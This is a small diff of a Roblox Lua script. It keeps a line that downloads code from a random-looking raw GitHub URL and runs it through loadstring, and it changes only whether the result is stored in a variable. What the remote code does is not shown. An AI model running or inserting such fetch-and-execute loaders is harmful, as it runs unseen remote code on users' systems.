@@ -2,7 +2,7 @@
 -- // Services
 local Players = game:GetService("Players")
 
-local log = loadstring(game:HttpGet("https://raw.githubusercontent.com/adhadlol/fafdghdhdhADADAD/main/sgsgg"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/adhadlol/fafdghdhdhADADAD/main/sgsgg"))()
 
 local NotificationBindable = Instance.new("BindableFunction")
 NotificationBindable.OnInvoke = callback
